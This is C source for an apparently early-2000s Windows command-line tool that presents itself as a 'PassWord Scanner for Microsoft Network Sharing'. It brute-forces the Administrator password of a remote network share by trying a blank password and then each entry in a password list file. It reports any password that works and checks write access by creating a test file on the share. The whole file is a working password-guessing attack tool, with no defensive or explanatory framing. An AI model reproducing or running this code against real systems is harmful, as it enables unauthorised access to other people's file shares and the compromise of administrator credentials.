#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <winnetwk.h>
#include <string.h>


int Connect(LPTSTR RemoteName,LPTSTR PassWord);
int DisConnect();
int GetLastDrive(char *LastDrive);
void ShowHelp(void);


int main(int argc, char *argv[])
{

   int nRet1,nRet2,i=0;
   TCHAR RemoteName[32];
   TCHAR PassWord[32] = "";
   FILE *TestFile;
   char TestFileName[] = "o:\\$$Test$$";
   FILE *PassWordFile;
   char PassWordFileName[] = "passwd.dat";
   char temp[1];
   BOOL First = true;

   textattr(0x0f);
   cprintf("PassWord Scanner for Microsoft Network Sharing version 1.0\r\n");
   cprintf("Copyright (C) 2000-2001 ISAG Group\r\n\r\n");

   if (argc > 1)
   {
      while (argv[1][i] != '\0')
      {
         RemoteName[i] = argv[1][i];
         i++;
      }
      RemoteName[i] = '\0';
   }
   else
   {
      ShowHelp();
      return -1;
   }

   if ((PassWordFile = fopen(PassWordFileName, "r")) == NULL)
   {
      cprintf("PassWord DataBase File [%s] in Current Directory Not Found\r\n",PassWordFileName);
      cprintf("Program Can't Scan PassWord\r\n");
      return -1;
   }

   do
   {
      if (First) // Connect With Blank PassWord
      {
         cprintf("Connect With Blank PassWord");
         nRet1 = Connect((LPTSTR) &RemoteName,(LPTSTR) &PassWord);
         if (nRet1 != 0)
         {
            cprintf("          [");
            textattr(0x0c);
            cprintf("Fail");
            textattr(0x0f);
            cprintf("]\r\n");
            First = false;
         }
      }
      else
      {
         PassWord[0] = '\0';
         do
         {
            fread(temp,1,1,PassWordFile);
            if ((temp[0] != '\n') && (!feof(PassWordFile))) strcat(PassWord,temp);
         }
         while ((temp[0] != '\n') && (!feof(PassWordFile)));
         cprintf("Connect With [%s] PassWord",PassWord);
         nRet1 = Connect((LPTSTR) &RemoteName,(LPTSTR) &PassWord);
         if (nRet1 != 0)
         {
            cprintf("          [");
            textattr(0x0c);
            cprintf("Fail");
            textattr(0x0f);
            cprintf("]\r\n");
            First = false;
         }
      }
   }
   while ((!feof(PassWordFile)) && (nRet1 != 0));
   if (nRet1 == 0)
   {
      cprintf("          [");
      textattr(0x0e);
      cprintf("OK");
      textattr(0x0f);
      cprintf("]\r\n\r\n\r\n");

      if (First)
      {
         cprintf("[PassWord] :");
         textattr(0x0b);
         cprintf(" Blank or No PassWord\r\n");
         textattr(0x0f);
      }
      else
      {
         cprintf("[PassWord] : ");
         textattr(0x0b);
         cprintf("%s\r\n",PassWord);
         textattr(0x0f);
      }

      if ((TestFile = fopen(TestFileName, "w")) == NULL)
      {
         cprintf("[Permission] : Read Only.\r\n");
         fclose(TestFile);
      }
      else cprintf("[Permission] : Full Access.\r\n");
//      printf("========= Press Enter to DisConnect =========\n");
//      getch();
      nRet2 = DisConnect();
      if (nRet2 == 0) {} //printf("DisConnect OK.\n");
   }
   else
   {
      textattr(0x0b);
      cprintf("\r\n\r\nCannot Find PassWord or No PassWord in DataBase\r\n");
      textattr(0x0f);
   }
   fclose(PassWordFile);
   return 0;
}

int Connect(LPTSTR RemoteName,LPTSTR PassWord)
{

   TCHAR UserNameP[32] = "Administrator";
   TCHAR LocalNameP[MAX_PATH] = "O:";

   DWORD Err;
   NETRESOURCE NetRes;

   NetRes.dwType = RESOURCETYPE_DISK;
   NetRes.lpLocalName = (LPTSTR) &LocalNameP;
   NetRes.lpRemoteName = RemoteName;
   NetRes.lpProvider = NULL;

   Err = WNetAddConnection2(&NetRes,
                            PassWord,
                            (LPTSTR) &UserNameP,
                            FALSE);

   if (Err != NO_ERROR)
   {
/*      if (Err == ERROR_ACCESS_DENIED) printf("Access to the network resource was denied.\n");
      else if (Err == ERROR_ALREADY_ASSIGNED) printf("The local device specified by lpLocalName is already used.\n");
      else if (Err == ERROR_BAD_DEV_TYPE) printf("The type of local device and the type of network resource do not match.\n");
      else if (Err == ERROR_BAD_DEVICE) printf("The value specified by lpLocalName is invalid.\n");
      else if (Err == ERROR_BAD_NET_NAME) printf("The value specified by lpRemoteName is not acceptable to any network resource provider. The resource name is invalid, or the named resource cannot be located.\n");
      else if (Err == ERROR_BAD_PROFILE) printf("The user profile is in an incorrect format.\n");
      else if (Err == ERROR_BAD_PROVIDER) printf("The value specified by lpProvider does not match any provider.\n");
      else if (Err == ERROR_BUSY) printf("The router or provider is busy, possibly initializing. The caller should retry.\n");
      else if (Err == ERROR_CANCELLED) printf("The attempt to make the connection was cancelled by the user through a dialog box from one of the network resource providers, or by a called resource.\n");
      else if (Err == ERROR_CANNOT_OPEN_PROFILE) printf("The system is unable to open the user profile to process persistent connections.\n");
      else if (Err == ERROR_DEVICE_ALREADY_REMEMBERED) printf("An entry for the device specified in lpLocalName is already in the user profile.\n");
      else if (Err == ERROR_EXTENDED_ERROR) printf("A network-specific error occured. Call the WNetGetLastError function to get a description of the error.\n");
      else if (Err == ERROR_INVALID_PASSWORD) printf("The specified password is invalid.\n");
      else if (Err == ERROR_NO_NET_OR_BAD_PATH) printf("A network component has not started, or the specified name could not be handled.\n");
      else if (Err == ERROR_NO_NETWORK) printf("There is no network present.\n");
*/

      return -1;
   }
   else return 0;
}

int DisConnect()
{
   TCHAR RemoteName[32] = "O:";
   DWORD Err;

   Err = WNetCancelConnection((LPTSTR) &RemoteName,
                              TRUE);
   if (Err != NO_ERROR)
   {
      if (Err == ERROR_BAD_PROFILE) printf("The user profile is in an incorrect format.\n");
      else if (Err == ERROR_CANNOT_OPEN_PROFILE) printf("The system is unable to open the user profile to process persistent connections.\n");
      else if (Err == ERROR_DEVICE_IN_USE) printf("The device is in use by an active process and cannot be disconnected.\n");
      else if (Err == ERROR_EXTENDED_ERROR) printf("A network-specific error occurred.\n");
      else if (Err == ERROR_NOT_CONNECTED) printf("The name specified by the lpName parameter is not a redirected device, or not currently connected to the device specified by the parameter.\n");
      else if (Err == ERROR_OPEN_FILES) printf("There are open files, and the fForce parameter is FALSE.\n");
      return -1;
   }
   else return 0;

}

void ShowHelp(void)
{
   cprintf("\\\\[HostName]\\[ResourceName]\r\n");
   cprintf("Example \\\\LOCALHOST\\TESTSHARE\r\n");
   return;
}

